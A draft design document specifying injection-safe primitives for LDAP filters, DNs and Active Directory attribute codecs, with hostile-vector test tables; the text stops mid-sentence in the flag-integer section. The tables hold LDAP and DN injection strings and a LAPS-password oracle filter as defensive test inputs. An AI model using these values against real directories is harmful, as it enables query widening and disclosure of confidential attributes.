---
title: "Safe primitives: LDAP filters, DNs, attribute codecs, command invocation, SQL"
date: 2026-10-02
updated: 2026-10-02
status: draft
owner: heramb
ticket: T-0005
sources_last_checked: 2026-10-02
---

# Safe primitives

Security-relevant strings are never built by hand. Each one has a single typed constructor, every
constructor has a hostile-vector suite, and a lint rule bans the unsafe alternative. This is the
direct countermeasure to PatchIQ's recurring `Sprintf`-built security strings
(`../UEM/knowledge/development/legacy/patchiq-postmortem.md` §11 #1, #10; `knowledge/memory/lessons.md`)
and to ManageEngine's record (21 of 24 ADAudit Plus CVEs in 2024 were SQLi; CVE-2022-28810 was
command injection; `build-feasibility/ad-technical-feasibility.md` §2.2, §2.7). CLAUDE.md rule 5.

**Notation.** In vector tables `\xNN` inside an *input* means the raw byte/char; in *expected*
outputs backslashes are literal. In tables `\|` is a literal `|`. "Error `X`" means a typed error
with stable code `X`; nothing is sent to a DC, interpreter or database.

| # | Primitive (provisional name) | Bans | Tiers (ADR-0001 proposed) | Implementer | § |
| --- | --- | --- | --- | --- | --- |
| P1 | `ldapfilter`: filter AST, canonical renderer, admin-filter parser | string-built filters; library filter compilation of user input | S, A | directory-engineer | 3 |
| P2 | `dn`: DN parse/build/compare; `ObjectRef` (`<GUID=…>`, `<SID=…>`) | `"CN="+name+","+parent`; `HasSuffix(dn, ou)` scope checks | S, A | directory-engineer | 4 |
| P3 | `attr`: codecs for GUID, SID, FILETIME/Interval, Generalized Time, flag integers (UAC, computed UAC, groupType), `unicodePwd` + `Secret` | ad-hoc byte/int parsing, bit maths in feature code, raw attribute access | S, A; `Secret` and any codec it parses also in N | directory-engineer | 5 |
| P4 | `psx` typed PowerShell operations · `pslit` display quoting · `proc` native process runner | script text with data, `-Command`, `-EncodedCommand`, shells, `.bat`/`.cmd` | S, A, X | backend-engineer (`psx`, `proc`), windows-engineer (sidecar host) | 6 |
| P5 | SQL access: generated queries, tenant context, report compiler, LIKE patterns | `Sprintf`/concatenated SQL, session-level `SET` | S | backend-engineer | 7 |

Every ticket that implements or changes a primitive is tagged `security-sensitive`
(`.claude/skills/security-baseline/SKILL.md` §1). Out of scope here: security descriptors (T-0028),
output encoders for CSV/XLSX/HTML (T-0029), XML/SAML, JWT and randomness (feasibility §2.7 rows; T-0007).

## 1. Rules that apply to every primitive

- **R1 Typed in, typed out.** Sinks (search, modify, invoke, query) accept only primitive types. The
  types have no public constructor from an unchecked string except the documented parsers, which
  validate. The unsafe call is unrepresentable, not merely discouraged.
- **R2 Escape once, at the boundary, inside the primitive.** No API accepts "already escaped" text;
  no `Raw(…)` escape hatch outside test files.
- **R3 Reject, never repair.** Invalid UTF-8, unpaired surrogates, NUL in strings, out-of-range numbers
  and non-canonical forms in strict mode are typed errors. Never substitute U+FFFD, trim, truncate or
  clamp silently: a repaired password or name is a different value.
- **R4 No Unicode normalisation.** Primitives send exactly the scalar values they were given; AD
  stores what it receives.
- **R5 Bounded.** Every parser caps input size, nesting depth and element count. Caps are named
  constants; values below are provisional until load tests.
- **R6 Errors** carry a stable code and at most a 64-char, log-escaped excerpt of non-secret input.
- **R7 Secrets** use the `Secret` type (§5.6): redacted formatting, no serialisation, zeroised after use,
  never in errors, logs, audit details or telemetry.
- **R8 One corpus.** Every vector in this document is also a machine-readable record (§8). Every
  implementation of a primitive, in any tier, runs the records for it in CI.
- **R9 The DC is the authority on AD semantics.** AD compares Unicode strings with sort keys built
  with `NORM_IGNORECASE | NORM_IGNOREKANATYPE | NORM_IGNORENONSPACE | NORM_IGNOREWIDTH`
  ([MS-ADTS string comparison][adts-sort]). No primitive claims to reproduce that. Identity is
  `objectGUID`; uniqueness is asked of the DC; authorisation walks GUID ancestry (feasibility §2.7).

## 2. Stack binding

Decided here, whatever ADR-0001 says: the semantics, escaping rules, error codes, vectors, corpus
format and the *meaning* of each lint rule. Bound by ADR-0001 (status `proposed` at time of writing):
package paths, library choice, concrete lint tools and which tiers implement what. §10 lists exactly
what changes when it is ratified. API sketches below use neutral pseudo-signatures; Go and C# names
appear only as illustrations of the proposed stack.

## 3. P1 — LDAP filter builder and admin-filter parser

**Guarantee.** A rendered filter has exactly the structure of its AST: no value can add, remove or
reorder components; attribute names come from the schema; matching rules come from a closed set.

### 3.1 API sketch

```
AttrName                         // opaque; generated schema constants, or ParseAttrName()
ParseAttrName(s, caller) -> AttrName | Error   // RFC 4512 descr/numericoid grammar + schema allowlist + caller may read it
Value.String(s) | Value.Bytes(b) | Value.GUID(g) | Value.SID(s) | Value.DN(d)
     | Value.Int32(i) | Value.Int64(i) | Value.FileTime(t) | Value.GeneralizedTime(t)
And(f…) Or(f…) Not(f)                    // And/Or need >= 1 child
Eq(a,v) Ge(a,v) Le(a,v) Approx(a,v) Present(a)
Substring(a, initial?, any[], final?)    // >= 1 non-empty part
Prefix(a,s)  Contains(a,s)
BitAnd(a, mask:uint32)  BitOr(a, mask:uint32)
InChain(a: DN-syntax link attr, d: DN)   // marked Expensive; caller opts in
Render(f) -> FilterString                // the only producer of FilterString
ParseAdminFilter(s, caller, limits) -> Filter | Error
connector.Search(base: ObjectRef, scope, filter: Filter, attrs: AttrName[])   // never a string
```

### 3.2 Canonical rendering

Per [RFC 4515 §3][rfc4515] and [Microsoft's filter syntax][ms-filter]:

- Always escaped: `*`→`\2a`, `(`→`\28`, `)`→`\29`, `\`→`\5c`, NUL→`\00` (RFC 4515 MUST) and `/`→`\2f`
  (Microsoft lists it; harmless under RFC 4515).
- Also escaped, as our canonical choice (RFC 4515 allows escaping any octet): 0x01–0x1F, 0x7F and every
  octet ≥ 0x80. Lower-case hex. The wire value is the same octets either way; the gain is deterministic
  vectors and ASCII-only logs.
- Binary values (GUID, SID, bytes): every octet escaped.
- Bit masks: unsigned decimal. Microsoft: the value "must be a decimal number", e.g.
  `(groupType:1.2.840.113556.1.4.803:=2147483648)` for security groups ([ms-filter]).
- DN-syntax values: render the DN canonically (§4.2), then filter-escape it. Two layers, in that order.

### 3.3 AD rules the builder enforces

1. **Schema allowlist** read at connect (ad-engineering gotcha 15). Unknown attribute → error, never
   "matches nothing".
2. **Constructed attributes are not filterable** (gotcha 12; schema `systemFlags` 0x4
   FLAG_ATTR_IS_CONSTRUCTED, [systemFlags][systemflags]).
3. **Value kind must match syntax.** `objectGUID` takes `Value.GUID` only; a dashed GUID string would
   silently match nothing (gotcha 24). DN-syntax attributes take `Value.DN`.
4. **No substring on DN-syntax attributes.** AD wildcard matching on DN attributes is not supported
   `[UNVERIFIED — lab]`; either way the admin would get a silently empty result.
5. **No empty assertions.** `Eq(a,"")` is an error (absence is `Not(Present(a))`). `Substring` with all
   parts empty is an error: it would render `(a=*)`, presence, the classic widening bug.
6. **Matching rules** limited to bit AND `…803`, bit OR `…804`, `LDAP_MATCHING_RULE_IN_CHAIN` `…1941`
   ([ms-filter]). `:dn:` and any other OID in admin filters → error. `InChain` is expensive on large
   estates (gotcha 9).
7. **Confidential and secret attributes** — `searchFlags` bit 0x80 fCONFIDENTIAL ([searchFlags][searchflags])
   plus our secret list (`ms-Mcs-AdmPwd`, `msLAPS-Password`, `msLAPS-EncryptedPassword`,
   `msFVE-RecoveryPassword`, `unicodePwd`) — are refused in admin filters and allowed in code only as
   `Present()` behind an explicit capability. Reason: AD enforces confidentiality against the *bound*
   identity, which is our service account. A help-desk user's `(ms-Mcs-AdmPwd=a*)` would otherwise turn
   result counts into a LAPS-password oracle.
8. **Delegation scope composes on the AST:** `And(scope, userFilter)`. Search base and scope come from
   the delegation, never from the filter. The filter only narrows; authorisation is still checked on
   every target object (security-baseline §7).
9. **Limits (provisional):** value ≤ 16 KiB; rendered filter ≤ 64 KiB; depth ≤ 32; ≤ 512 nodes; `Or`
   fan-out ≤ 256 (batch larger sets).

**Admin-supplied filters** (custom reports, saved searches) are parsed strictly by the RFC 4515
grammar, the whole input must be consumed, rules 1–9 apply, and the *canonical re-rendering* is what
is sent — never the original text. Saved searches store the AST and are re-validated at run time
(schema and the caller's rights may have changed).

### 3.4 Hostile vectors

| ID | Call / input | Expected | Why |
| --- | --- | --- | --- |
| LF-01 | `Eq(cn, "*)(uid=*")` | `(cn=\2a\29\28uid=\2a)` | classic injection stays one assertion |
| LF-02 | `Eq(cn, "*")` | `(cn=\2a)` | a literal star is not presence |
| LF-03 | `Eq(cn, ")(\|(objectClass=*)")` | `(cn=\29\28\|\28objectClass=\2a\29)` | close-and-reopen attempt |
| LF-04 | `Eq(cn, "\")` | `(cn=\5c)` | lone backslash |
| LF-05 | `Eq(cn, "\2a")` (backslash, `2`, `a`) | `(cn=\5c2a)` | pre-escaped text is data (R2) |
| LF-06 | `Eq(cn, String("a\x00b"))` | error `NulInString` | R3; binary NUL goes via `Value.Bytes` |
| LF-07 | `Eq(objectGUID, GUID 04030201-0605-0807-090a-0b0c0d0e0f10)` | `(objectGUID=\01\02\03\04\05\06\07\08\09\0a\0b\0c\0d\0e\0f\10)` | every byte escaped, stored byte order |
| LF-08 | `Eq(objectGUID, String("04030201-0605-…"))` | error `ValueKindMismatch` | would match nothing |
| LF-09 | `Eq(cn, "Zoë 😀")` | `(cn=Zo\c3\ab \f0\9f\98\80)` | non-ASCII escaped byte-wise |
| LF-10 | `Eq(cn, bytes ff fe)` as String | error `InvalidUTF8` | R3 |
| LF-11 | `Eq(cn, "\xc0\xaf")` (overlong `/`) | error `InvalidUTF8` | overlong encodings are invalid |
| LF-12 | `Eq(cn, "")` | error `EmptyAssertion` | rule 5 |
| LF-13 | `Prefix(cn, "")` | error `EmptySubstring` | would render `(cn=*)` |
| LF-14 | `Prefix(cn, "adm*in")` | `(cn=adm\2ain*)` | only the structural star is bare |
| LF-15 | `Prefix(manager, "CN=Smith")` | error `SubstringOnDN` | rule 4 |
| LF-16 | `Eq(manager, DN "CN=Smith\, John,OU=Sales,DC=corp,DC=example")` | `(manager=CN=Smith\5c, John,OU=Sales,DC=corp,DC=example)` | DN escape, then filter escape |
| LF-17 | `BitAnd(groupType, 0x80000000)` | `(groupType:1.2.840.113556.1.4.803:=2147483648)` | unsigned decimal ([ms-filter]) |
| LF-18 | `BitAnd(userAccountControl, 0x2)` | `(userAccountControl:1.2.840.113556.1.4.803:=2)` | disabled accounts |
| LF-19 | `ParseAttrName("cn=x)(objectClass")` | error `InvalidAttributeName` | attribute-name injection |
| LF-20 | `ParseAttrName("cn;binary")` | error `AttributeOptionsNotAllowed` | options never in filters |
| LF-21 | `Eq(msDS-User-Account-Control-Computed, Int32(16))` | error `ConstructedNotFilterable` | rule 2 |
| LF-22 | `ParseAdminFilter("(ms-Mcs-AdmPwd=a*)", helpdesk)` | error `ForbiddenAttribute` | rule 7 oracle |
| LF-23 | `ParseAdminFilter("(&(objectClass=user)(cn=a))(\|(objectClass=*))")` | error `TrailingInput` | parsers that stop after the first filter |
| LF-24 | `ParseAdminFilter("(cn:1.2.3.4:=x)")`, `("(cn:dn:=x)")` | error `UnsupportedMatchingRule` | rule 6 |
| LF-25 | `ParseAdminFilter` of 10 000 nested `(!(…))` | error `TooDeep`, no stack overflow | R5 |
| LF-26 | `ParseAdminFilter("(cn=\zz)")`, `("(cn=\2)")`, `("(cn=a\)")` | error `InvalidEscape` | malformed escapes |
| LF-27 | `And(Eq(sAMAccountType, 805306368), ParseAdminFilter("(\|(cn=*)(objectClass=*))"))` | `(&(sAMAccountType=805306368)(\|(cn=*)(objectClass=*)))` | scope only narrows |
| LF-28 | `Eq(cn, 20 000-char string)` | error `ValueTooLong` | R5 |
| LF-29 | `Or()` | error `EmptyComposite` | `(\|)` is RFC 4526 absolute-false; never emitted |

### 3.5 Lint / fitness rule (bans the unsafe alternative)

- Only the connector package imports the LDAP library (import-boundary rule, FF-SP1).
- Banned outside `ldapfilter`: the library's filter compiler and escaper (go-ldap `CompileFilter`,
  `EscapeFilter`); constructing a search request with a filter string (go-ldap `NewSearchRequest`,
  `SearchRequest{Filter:…}`) outside the connector; in tier X, `DirectorySearcher` and the string
  `SearchRequest` constructors of `System.DirectoryServices.Protocols` (BannedApiAnalyzers).
- Literal-shape scanner (FF-SP3): string literals containing `(&(`, `(|(`, `(objectClass=`,
  `(sAMAccountName=` or `:1.2.840.113556.1.4.` outside `ldapfilter` and tests fail the build.

## 4. P2 — DN parser/builder and object references

### 4.1 API sketch

```
RDNType                                   // closed enum from schema rDNAttID: CN, OU, DC, O, L, …
DN = [RDN]   RDN = (type: RDNType|OID, value: UnicodeString | OpaqueBytes)   // exactly one AVA
Parse(s, mode: Strict|Lenient) -> DN | Error   // Strict for DC output; Lenient for admin input
Child(parent: DN, t: RDNType, value) -> DN | Error
Render(d) -> DNString                     // canonical, §4.2
Equal(a,b), IsDescendantOf(c,a) -> bool   // display, dedup, grouping only — never identity or authz
ObjectRef = GUIDRef(GUID) | SIDRef(SID) | DNRef(DN)
ObjectRef.Parse(s) / .ForRequest() -> "<GUID=hex32>" | "<SID=hex>" | DNString
ParseExtendedDN(s) -> ExtendedDN{guid, sid?, dn}   // response-only; no conversion back to a request DN
```

### 4.2 Canonical value rendering

Per [RFC 4514 §2.4][rfc4514] plus Microsoft's AD reserved list ([AD DN reserved characters][ms-dn]):

- Backslash-escape `,` `+` `"` `\` `<` `>` `;`; leading `#` → `\#`; leading and trailing space → `\ `.
- Hex-escape (upper case): C0 controls incl. LF `\0A` and CR `\0D`, DEL `\7F`, `=` `\3D`, `/` `\2F`.
  Microsoft lists `=`, `/`, LF and CR as reserved in AD DNs and says `=` must be hex-encoded; `/`
  matters to ADsPath consumers in tier X ([LDAP ADsPath][adspath]).
- Everything else raw UTF-8. Never the `#hex` BER form, never RFC 1779 quoting.
- NUL is rejected (R3), not escaped: AD names do not contain it.

### 4.3 Parsing and AD rules

- RFC 4514 grammar; hex pairs must decode to valid UTF-8; `#hexstring` accepted only for OID-typed
  attributes and kept opaque.
- **Multi-valued RDNs are rejected.** AD disallows them and answers `invalidDNSyntax`
  ([MS-ADTS multivalued RDNs][adts-mvrdn]).
- **Lenient mode** (admin input only) additionally trims unescaped spaces around `,` and `=`. Whether
  AD itself accepts such input is `[UNVERIFIED — lab]`; we normalise before sending either way.
- **Alternative forms are not DNs.** `<GUID=…>`, `<SID=…>`, `<WKGUID=…>` go through `ObjectRef`.
  MS-ADTS: all DCs accept `<GUID=>` as the hex of the binary GUID (dashed form WS2003+), `<SID=>` as hex
  of the binary SID or a SID string; the *extended DN* form (`<GUID=…>;<SID=…>;dn`) is response-only and
  "not accepted as a means of specifying DNs in requests" ([MS-ADTS alternative DN forms][adts-altdn]).
  We emit the hex forms, which every DC accepts. Prefer `GUIDRef` for every modify, delete and modifyDN
  on an existing object.
- **Lengths** come from the schema's `rangeUpper` at connect (`cn` is 64, [cn][a-cn]); enforced by
  `Child()`, not by `Parse()` (DC output is authoritative). Parse caps: ≤ 64 RDNs, ≤ 16 KiB (provisional).

### 4.4 Equality is weaker than AD's — by design

`Equal` compares attribute types case-insensitively and unescaped values with Unicode simple case
folding, so `\,` = `\2C` and `cn=A` = `CN=a`. AD's comparison also ignores width, kana type and
non-spacing marks (R9): `CN=José` and `CN=Jose` may be one name to the DC `[UNVERIFIED — lab]`.
Therefore uniqueness checks ask the DC and still handle `entryAlreadyExists` (68) on add; `Equal`
and `IsDescendantOf` are banned in authorisation code (lint, §4.6).

### 4.5 Hostile vectors

Builder, parent `P` = `OU=Staff,DC=corp,DC=example`; outputs omit `,` + `P` for brevity.

| ID | Call / input | Expected | Why |
| --- | --- | --- | --- |
| DN-B01 | `Child(P, CN, "Smith, John")` | `CN=Smith\, John` | comma |
| DN-B02 | `",OU=Domain Admins"` | `CN=\,OU\3DDomain Admins` | placing the object elsewhere by name |
| DN-B03 | `"a+CN=b"` | `CN=a\+CN\3Db` | multi-valued RDN injection |
| DN-B04 | `" lead"` / `"trail "` | `CN=\ lead` / `CN=trail\ ` | edge spaces are significant |
| DN-B05 | `" "` / `"  "` | `CN=\ ` / `CN=\ \ ` | all-space values |
| DN-B06 | `"#admins"` / `"a#b"` | `CN=\#admins` / `CN=a#b` | leading `#` would mean BER hex |
| DN-B07 | `"\"quoted\""` | `CN=\"quoted\"` | quotes |
| DN-B08 | `"back\slash"` | `CN=back\\slash` | backslash |
| DN-B09 | `"<x>;y"` | `CN=\<x\>\;y` | angle brackets, semicolon |
| DN-B10 | `"line1\nline2"` / `"a\rb"` | `CN=line1\0Aline2` / `CN=a\0Db` | Microsoft reserved LF/CR |
| DN-B11 | `"a/b"` | `CN=a\2Fb` | ADsPath separator |
| DN-B12 | `"a\x00b"` | error `NulInString` | R3 |
| DN-B13 | `""` | error `EmptyRDNValue` | AD requires a value |
| DN-B14 | 65 × `a` as CN | error `ValueTooLong` | `cn` rangeUpper 64 |
| DN-B15 | `"𝔘ser Zoë"` | `CN=𝔘ser Zoë` | non-ASCII stays raw UTF-8 |
| DN-B16 | bytes `ff` | error `InvalidUTF8` | R3 |
| DN-B17 | `ParseRDNType("CN=x,OU")` | error `UnknownRDNType` | the type is an enum, not text |

| ID | Parse input | Expected | Why |
| --- | --- | --- | --- |
| DN-P01 | `CN=evil\,OU=HR,DC=corp,DC=example` | 3 RDNs, first value `evil,OU=HR`; `IsDescendantOf(·, "OU=HR,DC=corp,DC=example")` = false | defeats string-suffix scope checks |
| DN-P02 | `cn=A,ou=HR,dc=corp,dc=example` vs `CN=a,OU=hr,DC=CORP,DC=EXAMPLE` | `Equal` = true | case |
| DN-P03 | `CN=Smith\2C John,DC=x` vs `CN=Smith\, John,DC=x` | `Equal` = true; both render `CN=Smith\, John,DC=x` | escape forms |
| DN-P04 | `CN=a,,DC=x` | error `EmptyRDN` | |
| DN-P05 | `CN=a\` | error `DanglingEscape` | |
| DN-P06 | `CN=a\zz,DC=x` | error `InvalidEscape` | |
| DN-P07 | `CN=a\c3,DC=x` | error `InvalidUTF8` | truncated UTF-8 via hex |
| DN-P08 | `CN=a+CN=b,DC=x` | error `MultiValuedRDN` | AD rejects ([adts-mvrdn]) |
| DN-P09 | `CN=John Doe\0ADEL:6c3a4f9b-1c2d-4e5f-8a9b-0c1d2e3f4a5b,CN=Deleted Objects,DC=corp,DC=example` | parses; value contains LF; re-renders identically | deleted-object RDN |
| DN-P10 | `CN=Jane\0ACNF:6c3a4f9b-1c2d-4e5f-8a9b-0c1d2e3f4a5b,OU=Staff,DC=corp,DC=example` | parses | replication-conflict object |
| DN-P11 | `<GUID=0102030405060708090a0b0c0d0e0f10>` | `Parse`: error `UseObjectRef`; `ObjectRef.Parse`: ok | alternative form |
| DN-P12 | `<GUID=…>;<SID=…>;CN=x,DC=y` | `Parse`: error; `ParseExtendedDN`: ok, never sendable | response-only form |
| DN-P13 | `<GUID=01020304>,CN=x` · `<GUID=…>)(cn=*` | error `InvalidObjectRef` | ref injection |
| DN-P14 | `CN=x, OU=y` | Strict: error `UnexpectedSpace`; Lenient: `CN=x,OU=y` | admin paste |
| DN-P15 | `CN=a=b,DC=x` | value `a=b`; renders `CN=a\3Db,DC=x` | bare `=` is legal RFC 4514 |
| DN-P16 | `1.3.6.1.4.1.1466.0=#04024869,DC=x` | ok, value opaque bytes `04 02 48 69` | never re-emitted as `#` |
| DN-P17 | `CN="Smith, John",DC=x` | error `QuotedValueNotSupported` | RFC 1779 quoting |
| DN-P18 | 10 000 RDNs / 1 MiB | error `TooLong` | R5 |
| DN-P19 | `CN=José,OU=Staff,DC=x` vs `CN=Jose,OU=Staff,DC=x` | `Equal` = false; AD may treat them as one name → uniqueness via DC | R9 |

### 4.6 Lint / fitness rule

Banned outside `dn`: the library's DN parser and escaper (go-ldap `ParseDN`, `EscapeDN`); string
operations (`HasSuffix`, `HasPrefix`, `Contains`, `EqualFold`, `Split`) on `DNString` values (custom
analyzer); `dn.Equal`/`IsDescendantOf` from authorisation packages (import rule). Literal-shape
scanner: `"CN="`, `",OU="`, `",DC="` in literals joined by `+` or `Sprintf`/`string.Format` outside
`dn` and tests. Well-known containers are parsed constants inside `dn`.

## 5. P3 — Attribute codecs

**Shared rules.** `decode(raw LDAP octets) -> typed | error`; `encode(typed) -> octets`. The codec is
chosen by the attribute's syntax from the schema (`attributeSyntax` + `oMSyntax`), never by guessing
from the name in feature code. Raw values never leave the codec package. API output carries strings
(ISO 8601 UTC, decimal-as-string, canonical GUID/SID), never 64-bit JSON numbers (gotcha 22).
Integer text uses [RFC 4517 §3.3.16][rfc4517-int]: `( "-" LDIGIT *DIGIT ) / number` — no `+`, no
leading zeros, no `-0`, ASCII digits only.

**Lint (all codecs).** Raw entry accessors (go-ldap `GetAttributeValue(s)`, `GetRawAttributeValue(s)`)
are banned outside the connector and `attr`; UAC/groupType bit constants and `binary.LittleEndian`
on attribute bytes are banned in feature packages (analyzer).

### 5.1 GUID (`objectGUID`, octet string, 16 bytes)

`GUID.FromBytes(b)`, `GUID.Parse(text)` (dashed, optional braces, any case), `g.String()` (lower-case
dashed; Data1/2/3 little-endian in the octet string, [MS-DTYP 2.3.4][dtyp-guid]), `g.ObjectRef()`
(`<GUID=` + hex of the 16 bytes + `>`).

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| GUID-01 | bytes `01 02 … 10` | `04030201-0605-0807-090a-0b0c0d0e0f10` (not `01020304-0506-…`) | mixed-endian (gotcha 24) |
| GUID-02 | `{04030201-0605-0807-090A-0B0C0D0E0F10}` | same bytes as GUID-01; renders lower case, no braces | admin paste |
| GUID-03 | 15 bytes / 17 bytes | error `BadLength` | |
| GUID-04 | `04030201-0605-0807-090a-0b0c0d0e0f1` | error `BadFormat` | 31 hex digits |
| GUID-05 | `0403020106050807090a0b0c0d0e0f10` | error `BadFormat` | undashed is only valid inside `ObjectRef` |
| GUID-06 | `04030201-0605-0807-090a-0b0c0d0e0f1g` | error `BadFormat` | non-hex |
| GUID-07 | full-width digits `０４０３…` | error `BadFormat` | ASCII only |
| GUID-08 | `00000000-0000-0000-0000-000000000000` | error `NilGUID` | never an object identity |
| GUID-09 | `04030201-0605-0807-090a-0b0c0d0e0f10>,CN=x` | error `BadFormat` | ObjectRef injection |
| GUID-10 | valid text + `\x00` or trailing space | error `BadFormat` | |
| GUID-11 | `ObjectRef` of GUID-01 | `<GUID=0102030405060708090a0b0c0d0e0f10>` | hex form all DCs accept ([adts-altdn]) |

### 5.2 SID (`objectSid`, `sIDHistory`, `tokenGroups`)

Binary per [MS-DTYP 2.4.2.2][dtyp-sid-bin]: revision 1, sub-authority count ≤ 15, 6-byte authority
big-endian, sub-authorities 32-bit little-endian. Text per [MS-DTYP 2.4.2.1][dtyp-sid-str]: decimal
authority below 2^32, `0x` + 12 hex digits at or above; no leading zeros; at least one sub-authority;
ABNF literals are case-insensitive, so `s-1-…` parses. API: `SID.FromBytes`, `SID.Parse`, `Bytes()`,
`String()`, `DomainSID()`, `RID()`; filters always use the binary form.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| SID-01 | `S-1-5-32-544` | `01 02 00 00 00 00 00 05 20 00 00 00 20 02 00 00`; filter `\01\02\00\00\00\00\00\05\20\00\00\00\20\02\00\00` | BUILTIN\Administrators |
| SID-02 | `S-1-5-21-1004336348-1177238915-682003330-512` | `01 05 00 00 00 00 00 05 15 00 00 00 dc f4 dc 3b 83 3d 2b 46 82 8b a6 28 00 02 00 00`; RID 512 | domain SID |
| SID-03 | `s-1-5-18` | ok; renders `S-1-5-18` | ABNF case-insensitivity |
| SID-04 | bytes with revision 2 / text `S-2-5-32-544` | error `UnsupportedRevision` | |
| SID-05 | count byte 16 | error `TooManySubAuthorities` | max 15 |
| SID-06 | count 5, four sub-authorities present | error `Truncated` | |
| SID-07 | valid SID + trailing bytes | error `TrailingBytes` | length is declared, never assumed |
| SID-08 | `S-1-5-21-4294967296` | error `SubAuthorityOverflow` | > 2^32 − 1 |
| SID-09 | `S-1-5-21-01` | error `LeadingZero` | MS-DTYP |
| SID-10 | `S-1-0x000000000005-32-544` · `S-1-4294967296-1` | error `NonCanonicalAuthority` | hex only at or above 2^32 |
| SID-11 | `S-1-0x000100000000-1` | ok; round-trips | authority 2^32 |
| SID-12 | `S-1-5` | error `NoSubAuthority` | ABNF `1*SubAuthority` |
| SID-13 | `S-1-5-32-544-` · ` S-1-5-32-544` · `S-1-5-32-544\x00` | error `BadFormat` | |
| SID-14 | `S-1-5-21-１２３` | error `BadFormat` | full-width digits |

### 5.3 FILETIME and intervals (Large Integer, syntax 2.5.5.16)

Decode is **attribute-aware**: the same integer means different things on different attributes.
`FileTimeField -> Instant(utc, ticks) | Never | MustChange | NoValue | OutOfRange(raw)`;
`Interval -> Duration(d) | Forever`. Instants span 1601-01-01 to 9999-12-31T23:59:59.9999999Z
(ticks ≤ 2650467743999999999); beyond that → `OutOfRange`, displayed as "unrepresentable (raw N)",
never as a year-30828 date. Unix seconds = ticks / 10^7 − 11644473600.

| Attribute | Sentinels | Source |
| --- | --- | --- |
| `accountExpires` | `0` and `9223372036854775807` both → `Never` | [accountExpires][a-acctexp] |
| `pwdLastSet` | `0` → `MustChange`; absent → `NoValue`; write only `MustChange(true)`=0 / `(false)`=−1 | gotcha 36, [MS-ADTS computed UAC][adts-uacc] |
| `lastLogon`, `lastLogonTimestamp`, `badPasswordTime` | `0`/absent → `NoValue` — "no logon recorded", **not** "never logged on" | gotchas 16–17 |
| `lockoutTime` | `0` → `NoValue`; non-zero is an instant, **not** a lockout state | gotcha 27 |
| `msDS-UserPasswordExpiryTimeComputed` | `0x7FFFFFFFFFFFFFFF` → `Never`; `0` → `[UNVERIFIED]` | ad-engineering `reference/attributes.md` |
| `maxPwdAge`, `msDS-MaximumPasswordAge` | interval ≤ 0; `−2^63` (0x8000000000000000) → `Forever`; positive → error `InvalidPolicyValue`; `0` → `[UNVERIFIED]` | [adts-uacc]; Samba [bug 10512][samba-10512] (secondary) |
| `lockoutDuration`, `msDS-LockoutDuration` | `0` and `−2^63` → `Forever` (locked until an administrator unlocks) | derived from the MS-ADTS lockout formula ([adts-uacc]) |
| `lockoutObservationWindow`, `minPwdAge` | interval ≤ 0 | |

Lockout and password-expired *state* is never computed from these by feature code; it comes from
`msDS-User-Account-Control-Computed` (§5.5).

| ID | Attribute: raw | Expected | Why |
| --- | --- | --- | --- |
| FT-01 | accountExpires: `0` | `Never` | |
| FT-02 | accountExpires: `9223372036854775807` | `Never` | not 30828-09-14 |
| FT-03 | accountExpires: `134379828000000000` | 2026-11-01T05:00:00Z; display follows gotcha 20 ("end of" the previous local day) | |
| FT-04 | pwdLastSet: `0` | `MustChange` | not 1601 |
| FT-05 | pwdLastSet: `-1` (read) | `OutOfRange` | write-only value |
| FT-06 | lastLogonTimestamp: `0` | `NoValue` | wording rule |
| FT-07 | lastLogon: `134353728000000000` · `116444736000000000` | 2026-10-02T00:00:00Z · 1970-01-01T00:00:00Z | conversion anchors |
| FT-08 | accountExpires: `9223372036854775806` | `OutOfRange` | not the documented sentinel |
| FT-09 | maxPwdAge: `-36288000000000` | 42 days | negative interval (gotcha 21) |
| FT-10 | maxPwdAge: `-9223372036854775808` | `Forever` | |
| FT-11 | maxPwdAge: `36288000000000` | error `InvalidPolicyValue` | positive age |
| FT-12 | lockoutDuration: `0` · `-18000000000` | `Forever` · 30 minutes | |
| FT-13 | `+1`, ` 1`, `1 `, `0x10`, `1e5`, empty | error `BadInteger` | RFC 4517 grammar |
| FT-14 | `-0`, `0123` | error `BadInteger` | |
| FT-15 | `9223372036854775808`, `-9223372036854775809` | error `Overflow` | |
| FT-16 | `١٢٣` (Arabic-Indic), `１２３` (full-width) | error `BadInteger` | ASCII digits only |
| FT-17 | lastLogon: `9007199254740993` → API | `"raw":"9007199254740993"` as a JSON string | 2^53 + 1 would round as a number |

### 5.4 Generalized Time (syntax 2.5.5.11, oMSyntax 24)

Decode: full [RFC 4517 §3.3.13][rfc4517-gt] grammar (hour-only, minutes, fraction with `.` or `,`, `Z`
or ±hh[mm]) → UTC instant. Encode: always `YYYYMMDDHHMMSS.0Z` in UTC, AD's observed output form
(e.g. `whenCreated`); sub-seconds truncated, which keeps `>=` window filters inclusive. UTC-Time
(oMSyntax 23, two-digit years) shares syntax 2.5.5.11 and has its own decoder, selected by oMSyntax.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| GT-01 | `20261002101112.0Z` | 2026-10-02T10:11:12Z; re-encodes identically | AD form |
| GT-02 | `20261002101112Z` | same instant | no fraction |
| GT-03 | `2026100210Z` | 10:00:00Z | hour-only is legal |
| GT-04 | `20261002101112,5Z` | 10:11:12.5Z | comma fraction |
| GT-05 | `20261002101112+0530` | 2026-10-02T04:41:12Z | offset |
| GT-06 | `20261002101112` | error `MissingTimeZone` | zone is mandatory; local time is ambiguous |
| GT-07 | `20261302101112.0Z` · `20260230101112.0Z` · `20261002241112.0Z` | error `BadMonth` · `BadDay` · `BadHour` | |
| GT-08 | `20261002101160.0Z` | error `LeapSecondUnsupported` | legal in RFC 4517; refused rather than shifted |
| GT-09 | `20261002101112.0+2400` | error `BadOffset` | |
| GT-10 | `20261002101112.Z` | error `BadFraction` | empty fraction |
| GT-11 | full-width digits; trailing space or NUL | error `BadFormat` | |
| GT-12 | `16010101000000.0Z` | 1601-01-01T00:00:00Z | appears in `dSCorePropagationData`; not a real event time `[UNVERIFIED]`; UI must not show "1601" |
| GT-13 | 65-char input | error `TooLong` | R5 |
| GT-14 | `261002101112Z` to the Generalized Time decoder | error `BadFormat` | UTC-Time is decoded separately |

### 5.5 Flag integers (Integer, syntax 2.5.5.9, signed 32-bit)

Types `UAC` (stored `userAccountControl`), `UACComputed` (`msDS-User-Account-Control-Computed`) and
`GroupType`, each `{known flags, unknownBits}` over the uint32 bit pattern.

- `UAC` has **no** lockout or password-expired accessor (unreliable, ad-engineering
